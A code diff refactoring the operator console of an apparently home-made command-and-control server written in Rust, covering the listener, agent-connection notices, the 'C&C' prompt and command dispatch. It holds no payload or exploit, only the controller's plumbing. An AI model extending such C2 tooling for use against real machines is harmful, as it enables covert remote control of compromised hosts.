@@ -1,5 +1,5 @@
 // Dependecies
-use std::{io::{self, Write}, net::{Shutdown, TcpListener, TcpStream}, sync::{Arc, mpsc::{Receiver, Sender}}, thread::{self, sleep}};
+use std::{io::{Write}, net::TcpListener, sync::{Arc, mpsc::{Receiver, Sender}}, thread::{self, sleep}};
 // use rustyline::error::ReadlineError;
 use rustyline::{DefaultEditor};
 use core::time;
@@ -14,67 +14,9 @@ use constants::{RESET, DIM, BOLD, WHITE, GREEN, YELLOW, RED, CYAN, UiEvent};
 use c2_state::C2State;
 
 
-pub fn build_prompt(state: &C2State) -> (String, String) {
-    let count = state.agent_count();
-    let module = state.current_mod();
-
-    let agents_color = match count {
-        0 => RED,
-        1..=4 => YELLOW,
-        _ => CYAN,
-    };
-
-    let raw = format!(
-        "C&C [agents:{count}] [mod:{module}] ❯ "
-    );
-
-    let styled = format!(
-        "{BOLD}{RED}C&C{RESET} \
-         {DIM}[{RESET}{agents_color}agents:{count}{RESET}{DIM}]{RESET} \
-         {DIM}[{RESET}{WHITE}mod:{module}{RESET}{DIM}]{RESET} \
-         {BOLD}{CYAN}❯{RESET} "
-    );
-
-    (raw, styled)
+fn handle_server_instruct(instruct: Vec<&str>, state: &C2State) -> Result<bool, String> {
+    commands::dispatch_server(instruct, state)
 }
-
-fn handle_client_instruct(instruct: &str, conn: &mut TcpStream) -> Result<bool, String> {
-    commands::dispatch_client(instruct, conn)
-}
-
-fn handle_server_instruct(instruct: Vec<&str>) -> Result<bool, String> {
-    commands::dispatch_server(instruct)
-}
-
-
-fn handle_client(mut conn: TcpStream, state: &C2State) -> Result<(), String>{
-    // let mut buff = [0; 1024];
-    let mut instruct = String::new();
-    let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;
-
-    loop {
-        instruct.clear(); // Clear the buffer
-
-        // Read from CLI 
-        let prompt = build_prompt(&state);
-        let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;
-
-        if instruct.trim().to_ascii_lowercase() == "q" || instruct.trim().to_ascii_lowercase() == "exit" {
-            conn.write_all(b"q").map_err(|e| e.to_string())?;
-            conn.shutdown(Shutdown::Both).map_err(|e| e.to_string())?;
-            break;
-        }
-        
-        match handle_client_instruct(instruct.trim(), &mut conn) {
-            Ok(b) if b => "",
-            Err(err) => { println!("An error has ocurred: {}", err); break; }
-            _ => break
-        };
-    }
-    
-    Ok(())
-}
-
 
 fn handle_new_connection(state: Arc<C2State>, ui_tx: Sender<UiEvent>) {
     let listener = TcpListener::bind("127.0.0.1:1337")
@@ -107,17 +49,19 @@ fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), 
     let mut rl = DefaultEditor::new().map_err(|e| e.to_string())?;
 
     loop {
-        // Consume all events
-        while let Ok(event) = ui_rx.try_recv() {
-            match event {
-                UiEvent::AgentConnected(addr) => {
-                    println!("\n\t{DIM}[{RESET}{GREEN}conn{RESET}{DIM}]{RESET} {WHITE}{}{RESET}\n", addr);
+        // If there is a session session DONT print message
+        if state.active_session().is_none() {
+            while let Ok(event) = ui_rx.try_recv() {
+                match event {
+                    UiEvent::AgentConnected(addr) => {
+                        println!("\n\t{DIM}[{RESET}{GREEN}conn{RESET}{DIM}]{RESET} {WHITE}{}{RESET}\n", addr);
+                    }
                 }
             }
         }
 
         // Read from CLI
-        let prompt = build_prompt(&state);
+        let prompt = constants::build_prompt(&state);
         let instruct = rl.readline(&prompt).map_err(|e| e.to_string())?;
 
         if instruct.trim().eq_ignore_ascii_case("q") 
@@ -130,8 +74,8 @@ fn handle_sessions(state: Arc<C2State>, ui_rx: Receiver<UiEvent>) -> Result<(), 
             let _ = rl.add_history_entry(instruct.as_str());
         }
         
-        match handle_server_instruct(instruct.trim().split_whitespace().collect()) {
-            Ok(true) => {}
+        match handle_server_instruct(instruct.trim().split_whitespace().collect(), &state) {
+            Ok(_) => (),
             Err(err) => { println!("An error has ocurred: {}", err); break; }
             _ => break
         };
